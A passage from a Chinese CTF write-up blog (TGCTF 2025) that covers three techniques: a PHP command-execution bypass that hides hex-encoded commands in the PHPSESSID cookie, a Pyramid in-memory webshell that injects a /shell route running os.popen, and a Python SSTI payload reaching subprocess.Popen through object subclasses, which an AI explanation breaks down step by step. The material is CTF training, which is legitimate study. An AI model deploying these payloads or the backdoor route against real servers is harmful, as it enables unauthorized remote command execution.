+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+</span></span><span class="line"><span class="cl">array(&#39;a&#39; =&gt; &#39;...&#39;, &#39;b&#39; =&gt; &#39;...&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>步骤 3.3</strong>：<code>end(current(get_defined_vars()))</code>
+将 <code>$_GET</code> 数组的内部指针移动到最后一个元素，并返回该元素的值。假设参数 <code>b</code> 是最后一个元素，则返回 <code>system('ls /')</code>。</p>
+</li>
+<li>
+<p><strong>步骤 3.4</strong>：外层 <code>eval</code> 执行结果
+最终执行 <code>eval(&quot;system('ls /')&quot;)</code>，即调用 <code>system('ls /')</code>，执行 Linux 命令 <code>ls /</code>，列出根目录内容。</p>
+</li>
+</ul>
+<h3 id="phpsessid绕过">PHPSESSID绕过
+</h3><p>当请求头中有cookie时，（ 或者走投无路时，我们可以尝试添加cookie ）这时候我们就可以考虑使用PHPSESSID绕过</p>
+<h5 id="hex2bin">hex2bin（）
+</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。所以我们可以将恶意代码转换成十六进制，然后在写入cookie中，从而达到执行命令的目的</p>
+<p>例：</p>
+<p>phpinfo();的十六进制编码，即706870696e666f28293b</p>
+<p>传入Payload:</p>
+<blockquote>
+<p>?参数=eval(hex2bin(session_id(session_start())));</p></blockquote>
+<p>然后在cookie中写入：</p>
+<blockquote>
+<p>cookie: PHPSESSID=706870696e666f28293b</p></blockquote>
+<p>TGCTF中的预期解就是这样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?tgctf2025=session_start();system(hex2bin(session_id()));
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PHPSESSID=636174202f666c6167 cat /flag的十六进制
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<blockquote>
+<p><a class="link" href="https://blog.csdn.net/2301_76690905/article/details/133808536"  target="_blank" rel="noopener"
+    >无参数RCE绕过的详细总结（六种方法）</a>
+<a class="link" href="https://juejin.cn/post/7173629924555620388"  target="_blank" rel="noopener"
+    >深入浅出带你学习无参RCE </a>
+<a class="link" href="https://blog.csdn.net/CSDNiamcoming/article/details/108866436"  target="_blank" rel="noopener"
+    >php 命令执行中 PHPSESSID 妙用</a></p></blockquote>
+<h2 id="内存马pyramid-框架内存马">内存马，pyramid 框架内存马
+</h2><h3 id="内存马">内存马
+</h3><p>这个后面另外详细写一篇进行整理</p>
+<h5 id="pyramid-框架内存马">pyramid 框架内存马
+</h5><p>这道题中我们注意到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">def checkExpr(expr_input):
+</span></span><span class="line"><span class="cl">    expr = re.split(r&#34;[-+]&#34;, expr_input)
+</span></span><span class="line"><span class="cl">    print(exec(expr_input))  # 致命漏洞：未过滤直接执行用户输入！
+</span></span><span class="line"><span class="cl">    if len(expr) != 2:
+</span></span><span class="line"><span class="cl">        return 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一部分完全没有过滤用户输入，所以我们可以很轻松地传递 expr 来写入内存马</p>
+<p>我们这样注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">expr=exec(&#34;
+</span></span><span class="line"><span class="cl"># 获取当前配置器（确保作用域正确）
+</span></span><span class="line"><span class="cl">from pyramid.threadlocal import get_current_registry
+</span></span><span class="line"><span class="cl">registry = get_current_registry()
+</span></span><span class="line"><span class="cl">config = registry.settings[&#39;pyramid.configurator&#39;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 添加路由和视图
+</span></span><span class="line"><span class="cl">config.add_route(&#39;shell&#39;, &#39;/shell&#39;)
+</span></span><span class="line"><span class="cl">config.add_view(
+</span></span><span class="line"><span class="cl">    lambda req: Response(__import__(&#39;os&#39;).popen(req.params.get(&#39;cmd&#39;)).read()),
+</span></span><span class="line"><span class="cl">    route_name=&#39;shell&#39;
+</span></span><span class="line"><span class="cl">)
+</span></span><span class="line"><span class="cl">config.commit()  # 关键！提交配置变更
+</span></span><span class="line"><span class="cl">&#34;)#+1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面访问 shell 路由来RCE就行</p>
+<p>这道题中的内存马比较好写，完全没有过滤，Pyramid又允许在运行时动态修改路由配置，所以我们直接往进加后门路由就好了</p>
+<h3 id="ssti类继承利用">SSTI，类继承利用
+</h3><p>Payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">(
+</span></span><span class="line"><span class="cl">    [].__class__.__mro__[1].__subclasses__()[351](
+</span></span><span class="line"><span class="cl">        &#39;cat flag&#39;, shell=True, stdout=-1
+</span></span><span class="line"><span class="cl">    ).communicate()[0].strip()
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用AI解释一下：</p>
+<p>这个代码片段是一个典型的 <strong>Python SSTI（Server-Side Template Injection）攻击 Payload</strong>，通过滥用 Python 的反射和继承机制来执行任意系统命令。以下是其详细解释和工作原理分析：</p>
+<hr>
+<p><strong>代码结构拆解</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">(
+</span></span><span class="line"><span class="cl">    [].__class__.__mro__[1].__subclasses__()[351](
+</span></span><span class="line"><span class="cl">        &#39;cat flag&#39;, shell=True, stdout=-1
+</span></span><span class="line"><span class="cl">    ).communicate()[0].strip()
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><strong>逐层解析</strong></p>
+<ol>
+<li><strong><code>[]</code>（空列表）</strong></li>
+</ol>
+<ul>
+<li>创建一个空列表对象，作为后续操作的起点。</li>
+</ul>
+<ol>
+<li><strong><code>.__class__</code></strong></li>
+</ol>
+<ul>
+<li>
+<p>获取列表对象的类（即</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">list_class = [].__class__  # 等价于 list
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<ol>
+<li><strong><code>.__mro__</code></strong></li>
+</ol>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>是一个元组，表示类的</p>
+<p>方法解析顺序</p>
+<p>（Method Resolution Order）。对于</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">list
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类，其继承链为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+</span></span><span class="line"><span class="cl">list → object
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">mro_tuple = list_class.__mro__  # 输出：(list, object)
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<ol>
+<li><strong><code>[1]</code>（取第二个元素）</strong></li>
+</ol>
+<ul>
+<li>
+<p>取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__mro__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>的第二个元素（即</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">object_class = mro_tuple[1]  # 等价于 object
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<ol>
+<li><strong><code>.__subclasses__()</code></strong></li>
+</ol>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">object
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__subclasses__()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>方法返回</p>
+<p>所有直接子类的列表</p>
+<p>。这些子类包括 Python 内置的许多类，例如：</p>
+<ul>
+<li>
+<p><code>type</code>（元类）</p>
+</li>
+<li>
+<p><code>int</code>, <code>str</code>, <code>list</code>, <code>dict</code> 等基本类型</p>
+</li>
+<li>
+<p><code>subprocess.Popen</code>（关键点！）</p>
+</li>
+<li>
+<p>其他系统级类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">subclasses = object_class.__subclasses__()
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong><code>[351]</code>（索引 351）</strong></li>
+</ol>
+<ul>
+<li>
+<p>通过索引</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">351
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>定位到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">subprocess.Popen
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">Popen_class = subclasses[351]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>关键点</strong>：索引 <code>351</code> 是根据特定 Python 版本和环境确定的。例如，在 Python 3.8 中，<code>subprocess.Popen</code> 的索引可能为 <code>351</code>，但不同版本或环境可能不同。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong>调用 <code>Popen</code> 构造函数</strong></li>
+</ol>
+<ul>
+<li>
+<p>使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Popen
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类创建进程对象，执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">process = Popen_class(&#39;cat flag&#39;, shell=True, stdout=-1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>'cat flag'</code>：要执行的系统命令。</li>
+<li><code>shell=True</code>：允许通过 shell 执行命令（危险！）。</li>
+<li><code>stdout=-1</code>：等同于 <code>stdout=subprocess.PIPE</code>，捕获标准输出。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong><code>.communicate()</code></strong></li>
+</ol>
+<ul>
+<li>
+<p>等待进程完成，并返回</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(stdout_data, stderr_data)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>元组：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">output_tuple = process.communicate()
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<ol>
+<li><strong><code>[0].strip()</code></strong></li>
+</ol>
+<ul>
+<li>
+<p>获取标准输出（</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">stdout_data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>）并去除首尾空白字符：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">result = output_tuple[0].strip()
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/nsilab%E6%B7%98%E6%B1%B0%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NSILAB淘汰赛复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/dasctf2024%E5%8D%81%E6%9C%88%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTF2024十月赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/dasctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTF</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
